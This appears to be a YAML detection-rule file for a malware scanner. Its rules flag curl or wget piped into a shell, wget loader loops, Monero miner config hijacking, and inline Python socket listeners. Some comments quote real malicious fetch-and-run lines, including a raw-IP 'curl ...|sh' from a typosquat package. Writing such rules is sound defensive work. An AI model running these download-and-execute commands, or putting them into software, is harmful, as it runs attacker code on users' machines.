defaults:
  platforms: [unix]
  for: [shell]
traits:
- id: execute-dot-slash
  desc: "./ execution pattern"
  crit: component
  conf: 0.6
  attack: T1059.004
  if:
    type: text
    regex: '(^|\n|[;&|]{1,2}|\bnohup\s+)\s*\./[a-zA-Z0-9_][a-zA-Z0-9_.-]+'
- id: inline__curl-silent-stdout__any_1
  desc: "Curl silent download pattern 1"
  crit: component
  unless:
  - id: well-known/app/finance/coingecko::benign-coingecko-price-api
  if:
    type: text
    regex: 'curl(\.exe)?\s+[^|&\n]{0,120}-s[^|&\n]{0,120}(https?://|ftp://)'
  not:
  - substr: api.coingecko.com/api/v3/simple/price
  - substr: curl --unix-socket
  - regex: 'puts\s+["''][^"''\n]{0,120}curl\s+--unix-sock(et)?'
- id: inline__curl-silent-stdout__any_2
  desc: "Curl silent download pattern 2"
  crit: component
  unless:
  - id: well-known/app/finance/coingecko::benign-coingecko-price-api
  if:
    type: text
    regex: 'curl(\.exe)?\s+[^|&\n]{0,120}--silent[^|&\n]{0,120}(https?://|ftp://)'
  not:
  - substr: api.coingecko.com/api/v3/simple/price
  - substr: curl --unix-socket
  - regex: 'puts\s+["''][^"''\n]{0,120}curl\s+--unix-sock(et)?'
# Download-and-execute: a remote fetch piped straight into a shell
# (`curl … | bash`). Scoped to the script/source languages where loaders embed
# this as a string handed to a process-exec API (Node child_process, Ruby system,
# Python subprocess, Go os/exec). Anchored on the curl/wget+pipe+shell triad so
# a stray "| sh" does not fire.
- id: curl-download-pipe-shell
  desc: Remote download piped into a shell
  crit: notable
  conf: 0.9
  for: [shell, python, javascript, typescript, ruby, go, rust]
  not:
    # `curl … | sh` with the URL elided is someone WRITING ABOUT the idiom --
    # CodeGPT's TUI bundle carries it inside a "Code Execution From Untrusted
    # Source" warning, and Zencoder's CLI embeds an agent policy doc with
    # "`curl ... | bash`, `wget ... | sh`" as placeholder examples of what to
    # never auto-approve. A command has a URL; an ellipsis is a placeholder.
    - regex: '(curl|wget)\s+(…|\\u2026|\.\.\.)[\s\\]{0,4}\|'
  unless:
  - id: objectives/execution/interpreter/script/download::curl-pipe-rustup-installer
  - id: well-known/app/ai/gateway/localai/
  - type: text
    substr: pub struct BashTool
  - type: text
    substr: Destructive commands require user confirmation
  - type: text
    regex: '"slug":"[^"]+"|"sections":\[\{"id":'
  - type: text
    regex: 'https://rclone\.org/install\.sh\s*\|\s*bash\b'
  - type: text
    regex: 'https://astral\.sh/uv/install\.sh\s*\|\s*(sh|bash)\b'
  if:
    # Require whitespace + >=4 non-pipe chars (the URL / flags) between the
    # downloader and the pipe, so a bare mention of "curl|bash" in a comment or
    # doc string does NOT match — only a real `curl <url/flags> | bash`.
    type: text
    regex: '(curl|wget)(\.exe)?\s+[^\n|]{4,200}\|\s*(/usr/bin/|/bin/)?(bash|sh)\b'
- id: curl-pipe-rclone-installer
  desc: rclone installer piped to bash
  crit: notable
  conf: 0.9
  for: [shell, python, javascript, typescript, ruby, go, rust, dockerfile]
  if:
    type: text
    regex: 'https://rclone\.org/install\.sh\s*\|\s*bash\b'
- id: curl-pipe-install-sh-url
  desc: Remote install.sh URL in shell pipe
  crit: component
  conf: 0.86
  for: [shell, python, javascript, typescript, ruby, go, rust]
  if:
    type: text
    regex: '(curl|wget)(\.exe)?\s+[^\n|]{0,160}/install\.sh[^\n|]{0,80}\|'
- id: printf-wget-pipe-bash-loader
  desc: printf-built wget pipe bash loader
  crit: suspicious
  conf: 0.9
  attack: T1105
  if:
    type: text
    regex: 'printf\s+["''][\s\S]{0,320}\bwget\b[\s\S]{0,240}\|\s*bash\b'
- id: random-sleep-fetch-loop
  desc: randomized sleep fetch loop
  crit: suspicious
  conf: 0.88
  attack: T1027
  if:
    type: text
    regex: 'while\s+true\s*;?\s*do[\s\S]{0,160}sleep\s+\$\(\(\s*RANDOM\s*%[\s\S]{0,260}\bwget\b'
- id: miner-hijack-config
  desc: Hijacking other miner configurations
  crit: suspicious
  if:
    type: text
    substr: 'kill_list.patterns'
- id: miner-config-poisoning
  desc: Poisoning other miner configurations
  crit: suspicious
  if:
    type: text
    substr: 'hijacked_${_hhex}'
- id: python-inline-socket-listener
  desc: Inline Python background socket listener
  crit: suspicious
  conf: 0.9
  if:
    type: text
    regex: "python3?\\s+-c\\s+[\"'].{0,50}socket\\.socket.{0,50}bind.{0,50}listen.{0,50}os\\.fork"
- id: nodesource-setup-url
  desc: NodeSource Node.js setup script URL
  crit: notable
  conf: 0.95
  if:
    type: text
    substr: deb.nodesource.com/setup_
composite_rules:
- id: curl-pipe-obvious-installer
  desc: Remote install.sh piped into shell
  crit: notable
  conf: 0.86
  for: [shell, python, javascript, typescript, ruby, go, rust]
  all:
  - id: curl-pipe-install-sh-url
  - id: micro-behaviors/data/runtime/keywords::pipe-to-shell
  unless:
  - id: micro-behaviors/os/service/legitimate::installer-script
  - id: metadata/file/extension/identity::markdown-file-basename
  - id: well-known/tool/development/aube::aube-lifecycle-scanner-source
  - id: well-known/app/ai/coding-agent/vtcode::install-script-url
  - id: well-known/app/ai/coding-agent/vtcode::vtcode-agent-package
- id: process-api-call
  desc: Process API invocation
  crit: component
  conf: 0.9
  any:
  - id: micro-behaviors/process/create/exec
  - id: micro-behaviors/process/create/system::ruby-system
- id: process-curl-pipe-shell-call
  desc: Process API executes shell pipe
  crit: component
  conf: 0.92
  for: [python, javascript, typescript, ruby, go, rust]
  all:
  - id: process-api-call
  - id: curl-download-pipe-shell
  near_bytes: 768
# A curl|bash download-exec string that the host program executes via a
# process/exec API is remote code execution staged from library/app code —
# never a legitimate pattern for a published package. Language-AGNOSTIC: the
# `micro-behaviors/process/create/` leg matches Node child_process, Ruby
# system/exec, Python subprocess, and Go os/exec alike, so the same loader is
# caught in JS, Ruby, Python, Go, etc. Anchors the @403name/ether-js typosquat
# (Stage 2: `curl -sSfL <c2>/api/payload/ | /bin/bash`).
- id: spawned-curl-pipe-shell-rce
  desc: Spawned curl-pipe-shell remote code execution
  crit: hostile
  conf: 0.97
  attack: "T1059.004"
  for: [python, javascript, typescript, ruby, go, rust]
  all:
  - id: curl-download-pipe-shell
  - id: process-curl-pipe-shell-call
  unless:
  - id: micro-behaviors/os/service/legitimate/
  - id: metadata/library/structure::js-dist-asset-bundle
  - id: metadata/library/structure::js-large-module-bundle
  - id: micro-behaviors/os/service/legitimate::ci-cd-pipeline
- id: python-inline-mutex-hostile
  desc: Hostile Python inline socket mutex script
  crit: hostile
  conf: 0.95
  all:
  - id: python-inline-socket-listener
  - id: micro-behaviors/os/sysinfo/network::ss
- id: hostile-miner-hijack
  desc: Known hostile miner hijacking behavior
  crit: hostile
  any:
  - id: miner-hijack-config
  - id: miner-config-poisoning
- id: xmr-miner-config-hijack
  desc: Monero miner configuration hijack chain
  crit: hostile
  conf: 0.98
  attack: T1496
  all:
  - id: miner-hijack-config
  - id: miner-config-poisoning
  any:
  - id: micro-behaviors/communications/http/url/domain::xmr-host-with-port
  - id: micro-behaviors/communications/socket/tcp::stratum-port-3333
  needs: 2
- id: evasive-xmr-config-poisoner
  desc: Evasive Monero miner config poisoner
  crit: hostile
  conf: 0.97
  attack: T1496
  all:
  - id: xmr-miner-config-hijack
  - id: objectives/evasion/indicator-removal/history::histfile-devnull
- id: shell-fetch-exec-bash
  desc: Shell script downloads and executes via pipe to bash
  crit: hostile
  conf: 0.98
  attack: T1105
  unless:
  - id: well-known/tool/development/ghcup::ghcup-bootstrap-pipe
  - id: metadata/build/archive::source-archive-member
  - id: well-known/tool/development/dev-cli/npm-toolchain::npm-install-script-path
  - id: well-known/app/system/omarchy::source-tree
  - id: well-known/tool/development/chsrc::chsrc-source-installer-context
  - id: well-known/app/infrastructure/kubeblocks::build-tool-installer-context
  # See shell-fetch-exec-wget: a Dockerfile RUN line piping a fetched
  # installer into bash is build-time tool provisioning.
  - id: metadata/build/docker::dockerfile-basename
  # get-kube.sh (and siblings) document `wget|curl | bash` in comments;
  # they download release tarballs to disk, not pipe-execute payloads.
  - id: well-known/tool/sysadmin/kubernetes/bootstrap::kubernetes-shell-bootstrap
  all:
  - id: micro-behaviors/process/create/shell/spawn::bash-exec
  - id: micro-behaviors/data/runtime/keywords::pipe-to-shell
  any:
  - id: curl-silent-stdout
  - id: micro-behaviors/communications/http/download/wget::wget-silent-stdout
- id: shell-fetch-exec-curl
  desc: Shell script downloads via curl and executes via pipe
  crit: hostile
  conf: 0.95
  attack: T1105
  unless:
  - id: well-known/tool/development/ghcup::ghcup-bootstrap-pipe
  - id: metadata/build/archive::source-archive-member
  - id: well-known/tool/development/dev-cli/npm-toolchain::npm-install-script-path
  - id: well-known/app/system/omarchy::source-tree
  - id: well-known/tool/development/chsrc::chsrc-source-installer-context
  - id: well-known/app/infrastructure/kubeblocks::build-tool-installer-context
  # See shell-fetch-exec-wget: `curl -sSL <url> | sh` in a Dockerfile is
  # build-time tool provisioning, not payload delivery.
  - id: metadata/build/docker::dockerfile-basename
  - id: well-known/tool/sysadmin/kubernetes/bootstrap::kubernetes-shell-bootstrap
  all:
  - id: micro-behaviors/communications/http/download/curl::curl-cmd
  - id: curl-silent-stdout
  - id: micro-behaviors/data/runtime/keywords::pipe-to-shell
  any:
  - id: micro-behaviors/process/create/shell/spawn::bash-exec
  - id: micro-behaviors/process/interpreter/shell::bin-sh
- id: shell-fetch-exec-wget
  desc: Shell script downloads via wget and executes via pipe
  crit: hostile
  conf: 0.95
  attack: T1105
  # wget -O- for a JSON API piped to grep, plus a later curl|sh installer,
  # is not wget-to-shell. Require the wget stdout and shell pipe on the same
  # command cluster.
  near_lines: 4
  unless:
  - id: metadata/build/archive::source-archive-member
  - id: well-known/tool/development/chsrc::chsrc-source-installer-context
  - id: well-known/app/infrastructure/kubeblocks::build-tool-installer-context
  # A container image recipe provisioning upstream tooling with
  # `wget -O- <url> | sh` is the ordinary build-time install idiom, not a
  # dropper.  The atomic wget-pipe-* traits already exempt Dockerfiles.
  - id: metadata/build/docker::dockerfile-basename
  # Official cluster/get-kube.sh: usage comments show wget|bash; real
  # downloads write kubernetes.tar.gz then extract.
  - id: well-known/tool/sysadmin/kubernetes/bootstrap::kubernetes-shell-bootstrap
  all:
  - id: micro-behaviors/communications/http/download/curl::wget-cmd
  - id: micro-behaviors/communications/http/download/wget::wget-silent-stdout
  - id: micro-behaviors/data/runtime/keywords::pipe-to-shell
  any:
  - id: micro-behaviors/process/create/shell/spawn::bash-exec
  - id: micro-behaviors/process/interpreter/shell::bin-sh
- id: generated-wget-bash-loop-loader
  desc: Generated wget bash loop loader
  crit: hostile
  conf: 0.97
  attack: T1105
  all:
  - id: printf-wget-pipe-bash-loader
  - id: random-sleep-fetch-loop
  - id: objectives/command-and-control/dropper/execution/native-binary::world-writable-local-binary-exec
  - id: execute-dot-slash
  - id: micro-behaviors/fs/directory/delete::rm-rf
  any:
  - id: objectives/evasion/indicator-removal/logs::history-c
  - id: micro-behaviors/process/daemonize/detach::background-ampersand-hidden
- id: curl-silent-stdout
  desc: "Shell text contains a curl silent-output command"
  crit: notable
  conf: 0.9
  mbc: C0002
  attack: T1105
  size_max: 5000
  any:
  - id: inline__curl-silent-stdout__any_1
  - id: inline__curl-silent-stdout__any_2
  unless:
  - id: well-known/tool/development/composer::composer-installer-url
  - id: metadata/file/catalog/identity/
  - id: metadata/file/catalog/identity::platform-domain
  - id: well-known/app/finance/coingecko::benign-coingecko-price-api
  - id: micro-behaviors/communications/http/download/curl::curl-output-file
  - id: micro-behaviors/communications/http/download/curl::curl-output-redirect
  # Dockerfile RUN curl|bash for NodeSource (and similar) is build-time
  # provisioning; hostile shell-fetch-exec composites already carve this out.
  - id: metadata/build/docker::dockerfile-basename
  - id: nodesource-setup-url
- id: curl-pipe-shell-from-raw-ip
  desc: Remote script piped to shell from a raw IP
  crit: hostile
  conf: 0.96
  for: [shell, python, javascript, typescript, ruby, go, rust]
  attack: "T1105,T1059.004"
  mbc: "B0032,E1105"
  # curl <url> | sh from a literal-IP source. A hardcoded http://<ip>/...|sh is
  # a stage from a box the operator controls, chosen so no name sits in the
  # source or DNS. Worked example: a huggingface typosquat __init__.py running
  # os.system('curl http://192.3.209.43/favicon.txt|sh') on import.
  all:
  - id: curl-download-pipe-shell
  - id: micro-behaviors/communications/ip/literal::http-ip-url
# package-doc-curl-shell-delivery was removed: its `all:` was the canonical
# curl-pipe atom AND a second copy of the same matcher, so it restated one
# observation as a C2/dropper finding on every source tarball whose README
# documents an installer. Its own comment conceded it established neither
# execution nor a malicious endpoint. The atom itself now carries that fact at
# micro-behaviors/process/create/shell/pipeline::curl-pipe-shell-text.
